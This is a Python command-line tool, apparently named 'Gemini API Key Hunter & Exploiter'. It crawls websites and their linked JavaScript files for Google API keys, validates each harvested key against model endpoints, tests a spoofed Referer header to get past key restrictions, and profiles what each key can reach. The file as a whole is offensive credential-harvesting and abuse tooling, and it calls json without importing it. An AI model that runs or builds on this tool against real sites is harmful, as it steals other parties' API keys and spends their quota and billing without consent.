import argparse
import sys
import os
import re
import urllib.parse
import httpx
from typing import List, Dict, Any

# Regex to detect Google API Keys
API_KEY_REGEX = re.compile(r'AIzaSy[A-Za-z0-9-_]{33,45}')

class GeminiHunter:
    """
    Automated discovery, validation, and vulnerability verification engine for Google/Gemini API keys.
    """
    
    def __init__(self):
        # Prevent circular import and initialize helpers
        from app.services.gemini_exploit import GeminiExploiter
        self.exploiter = GeminiExploiter

    def extract_keys_from_text(self, text: str) -> List[str]:
        if not text:
            return []
        return list(set(API_KEY_REGEX.findall(text)))

    def crawl_and_extract(self, url: str) -> List[str]:
        """
        Mode 1: Crawl a single domain, fetch references, parse linked JS bundles.
        """
        keys = []
        try:
            # 1. Fetch home page
            r = httpx.get(url, timeout=10.0, follow_redirects=True)
            if r.status_code != 200:
                return []
            
            keys.extend(self.extract_keys_from_text(r.text))
            
            # 2. Extract script sources
            script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text)
            parsed_base = urllib.parse.urlparse(url)
            
            for src in script_srcs:
                # Build absolute URL
                if src.startswith("//"):
                    js_url = f"{parsed_base.scheme}:{src}"
                elif src.startswith("/"):
                    js_url = f"{parsed_base.scheme}://{parsed_base.netloc}{src}"
                elif not src.startswith("http"):
                    js_url = f"{parsed_base.scheme}://{parsed_base.netloc}/{src}"
                else:
                    js_url = src
                
                # Fetch script and extract keys
                try:
                    js_r = httpx.get(js_url, timeout=8.0)
                    if js_r.status_code == 200:
                        keys.extend(self.extract_keys_from_text(js_r.text))
                except Exception:
                    continue
        except Exception:
            pass
            
        return list(set(keys))

    def run_single_domain_scan(self, url: str) -> Dict[str, Any]:
        extracted = self.crawl_and_extract(url)
        results = []
        for key in extracted:
            validation = self.exploiter.test_models_endpoint(key)
            results.append({
                "key": key,
                "valid": validation.get("status") == "SUCCESS",
                "active_models": validation.get("models", [])
            })
        return {"target": url, "findings": results}

    def run_batch_domains_scan(self, domains: List[str]) -> List[Dict[str, Any]]:
        """
        Mode 2: Process batch of domains.
        """
        results = []
        for dom in domains:
            if not dom.strip():
                continue
            url = dom if dom.startswith("http") else f"http://{dom}"
            results.append(self.run_single_domain_scan(url))
        return results

    def run_js_list_scan(self, js_urls: List[str]) -> List[Dict[str, Any]]:
        """
        Mode 3: Extract from list of JavaScript files directly.
        """
        keys = []
        for js_url in js_urls:
            if not js_url.strip():
                continue
            try:
                r = httpx.get(js_url.strip(), timeout=8.0)
                if r.status_code == 200:
                    keys.extend(self.extract_keys_from_text(r.text))
            except Exception:
                continue
                
        results = []
        for key in list(set(keys)):
            validation = self.exploiter.test_models_endpoint(key)
            results.append({
                "key": key,
                "valid": validation.get("status") == "SUCCESS",
                "active_models": validation.get("models", [])
            })
        return results

    def run_raw_keys_validation(self, keys: List[str]) -> List[Dict[str, Any]]:
        """
        Mode 4: Accept a list of raw keys, validate, and check Referer bypass.
        """
        results = []
        for key in keys:
            if not key.strip():
                continue
            k = key.strip()
            # Standard check
            validation = self.exploiter.test_models_endpoint(k)
            # Referer bypass check
            bypass = self.exploiter.test_models_endpoint(k, "https://www.google.com/")
            results.append({
                "key": k,
                "valid": validation.get("status") == "SUCCESS",
                "active_models": validation.get("models", []),
                "bypass_valid": bypass.get("status") == "SUCCESS",
                "bypass_models": bypass.get("models", [])
            })
        return results

    def run_capability_evidence_scan(self, key: str) -> Dict[str, Any]:
        """
        Mode 5: Generate full capability scan.
        """
        return self.exploiter.scan_all_capabilities(key)

def main():
    parser = argparse.ArgumentParser(description="Gemini API Key Hunter & Exploiter CLI Tool")
    parser.add_argument("--mode", type=int, choices=[1, 2, 3, 4, 5], required=True,
                        help="Scan mode: 1=Single Domain, 2=Batch Domains, 3=JS URL List, 4=Raw Keys, 5=Capability Evidence Scan")
    parser.add_argument("--target", type=str, help="Target URL (Mode 1) or target Key (Mode 5)")
    parser.add_argument("--file", type=str, help="Input .txt file containing domains (Mode 2), JS links (Mode 3), or raw keys (Mode 4)")
    parser.add_argument("--key", type=str, help="Raw Google API Key to validate (Mode 4 / Mode 5)")
    
    args = parser.parse_args()
    
    # Simple workaround for relative imports if called directly
    sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
    from app.services.gemini_exploit import GeminiExploiter
    
    hunter = GeminiHunter()
    hunter.exploiter = GeminiExploiter
    
    if args.mode == 1:
        if not args.target:
            print("[!] Error: --target is required for Mode 1")
            sys.exit(1)
        res = hunter.run_single_domain_scan(args.target)
        print(json.dumps(res, indent=2))
        
    elif args.mode == 2:
        if not args.file or not os.path.exists(args.file):
            print(f"[!] Error: Valid --file is required for Mode 2")
            sys.exit(1)
        with open(args.file, "r") as f:
            targets = f.read().splitlines()
        res = hunter.run_batch_domains_scan(targets)
        print(json.dumps(res, indent=2))

    elif args.mode == 3:
        if not args.file or not os.path.exists(args.file):
            print(f"[!] Error: Valid --file is required for Mode 3")
            sys.exit(1)
        with open(args.file, "r") as f:
            js_links = f.read().splitlines()
        res = hunter.run_js_list_scan(js_links)
        print(json.dumps(res, indent=2))

    elif args.mode == 4:
        keys_list = []
        if args.key:
            keys_list.append(args.key)
        elif args.file and os.path.exists(args.file):
            with open(args.file, "r") as f:
                keys_list.extend(f.read().splitlines())
        else:
            print("[!] Error: --key or valid --file containing keys is required for Mode 4")
            sys.exit(1)
            
        res = hunter.run_raw_keys_validation(keys_list)
        print(json.dumps(res, indent=2))

    elif args.mode == 5:
        target_key = args.key or args.target
        if not target_key:
            print("[!] Error: --key or --target representing the raw key is required for Mode 5")
            sys.exit(1)
        res = hunter.run_capability_evidence_scan(target_key)
        print(json.dumps(res, indent=2))

if __name__ == "__main__":
    main()
